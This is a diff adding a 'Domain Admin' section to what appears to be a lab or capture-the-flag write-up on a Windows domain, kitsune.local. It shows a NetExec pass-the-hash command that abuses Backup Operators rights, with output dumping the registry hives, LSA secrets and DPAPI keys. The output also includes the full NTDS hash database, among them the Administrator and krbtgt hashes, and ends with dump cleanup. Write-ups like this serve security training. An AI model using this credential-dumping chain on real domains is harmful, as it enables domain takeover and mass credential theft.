@@ -447,6 +447,50 @@ SMB         10.1.176.128    445    DC01             [+] kitsune.local\svc_gmsa$:
 
 This user is now compromised!
 
-This user `svc_gmsa$` 
+This user `svc_gmsa$` is in the backup operators group
+
+# Domain Admin
+
+```python  
+ ~/hsm/kitsune ❯❯❯ nxc smb dc01.kitsune.local -u 'svc_gmsa$' -H '085691c182d60ab1a12466ce7b50d29d' --smb-timeout 5 -M backup_operator
+SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.176.128    445    DC01             [+] kitsune.local\svc_gmsa$:085691c182d60ab1a12466ce7b50d29d 
+BACKUP_O... 10.1.176.128    445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
+BACKUP_O... 10.1.176.128    445    DC01             Saved HKLM\SAM to \\10.1.176.128\SYSVOL\SAM
+BACKUP_O... 10.1.176.128    445    DC01             Saved HKLM\SYSTEM to \\10.1.176.128\SYSVOL\SYSTEM
+BACKUP_O... 10.1.176.128    445    DC01             Saved HKLM\SECURITY to \\10.1.176.128\SYSVOL\SECURITY
+SMB         10.1.176.128    445    DC01             [*] Copying "SAM" to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SAM"
+SMB         10.1.176.128    445    DC01             [+] File "SAM" was downloaded to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SAM"
+SMB         10.1.176.128    445    DC01             [*] Copying "SECURITY" to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SECURITY"
+SMB         10.1.176.128    445    DC01             [+] File "SECURITY" was downloaded to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SECURITY"
+SMB         10.1.176.128    445    DC01             [*] Copying "SYSTEM" to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SYSTEM"
+SMB         10.1.176.128    445    DC01             [+] File "SYSTEM" was downloaded to "/home/kali/.nxc/logs/DC01_10.1.176.128_2026-10-23_193851.SYSTEM"
+BACKUP_O... 10.1.176.128    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
+BACKUP_O... 10.1.176.128    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BACKUP_O... 10.1.176.128    445    DC01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BACKUP_O... 10.1.176.128    445    DC01             $MACHINE.ACC:plain_password_hex:dec5c211d4babd91e437304c43c778d6de456ecc929c4814883425cf929e33d9eb7d6d0147c801d263a5467ccf340b2b03dcb1c83a5bad6c7ee81391acf12a9c9b4159c736d32c68e301f35a66536423d3ae3416bbde25d75d79755a63c0b4513ebcae2988d8184eb9ab4927901ec4b09e2f1bb861f06474556cff298c08e4be1d38a0b5862d90920def2e5fc1c664adad34b4f2a31f5139cdba68129fe89b70dde6aac1f3e1f818fe6b8ebc70604c27354432e8e7e7970e3f463d0f92919d58ebbd328d52a9edc1eee7cbcec9a18f0cbb718ec6a273a568c76b630a84a820a8a3f467da2f6e4a31021b03b58ccbb021
+BACKUP_O... 10.1.176.128    445    DC01             $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45
+BACKUP_O... 10.1.176.128    445    DC01             dpapi_machinekey:0x2d3f243818d41c56a5d560c6f9e8e8e91c63cc7e
+dpapi_userkey:0xdbc4e9db99118d5c9bbfa64d0ca5c065bfa814b5
+BACKUP_O... 10.1.176.128    445    DC01             NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
+SMB         10.1.176.128    445    DC01             [+] kitsune.local\Administrator:2dffec5d0dda0cbc8bf571471641e001 (Pwn3d!)
+BACKUP_O... 10.1.176.128    445    DC01             [*] Dumping NTDS...
+SMB         10.1.176.128    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.1.176.128    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
+SMB         10.1.176.128    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.1.176.128    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d1c9d31dc9ece5e96fc344c85782ba93:::
+SMB         10.1.176.128    445    DC01             kitsune.local\ranch:1103:aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1:::
+SMB         10.1.176.128    445    DC01             kitsune.local\schlop:1105:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         10.1.176.128    445    DC01             kitsune.local\pebble:1106:aad3b435b51404eeaad3b435b51404ee:b83abecf382a399ee1885f72a596d2d3:::
+SMB         10.1.176.128    445    DC01             kitsune.local\ross:1107:aad3b435b51404eeaad3b435b51404ee:3f48c34a06f664d675b41282e7606ed7:::
+SMB         10.1.176.128    445    DC01             kitsune.local\protagonist:1108:aad3b435b51404eeaad3b435b51404ee:3f48c34a06f664d675b41282e7606ed7:::
+SMB         10.1.176.128    445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45:::
+SMB         10.1.176.128    445    DC01             svc_gmsa$:1602:aad3b435b51404eeaad3b435b51404ee:085691c182d60ab1a12466ce7b50d29d:::
+SMB         10.1.176.128    445    DC01             [+] Dumped 10 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.1.176.128_2026-10-23_193851.ntds of which 8 were added to the database
+SMB         10.1.176.128    445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.1.176.128    445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.1.176.128_2026-10-23_193851.ntds | cut -d ':' -f1
+BACKUP_O... 10.1.176.128    445    DC01             [*] Cleaning dump with user Administrator and hash 2dffec5d0dda0cbc8bf571471641e001 on domain kitsune.local
+BACKUP_O... 10.1.176.128    445    DC01             [*] Successfully deleted dump files !
+```
 
 
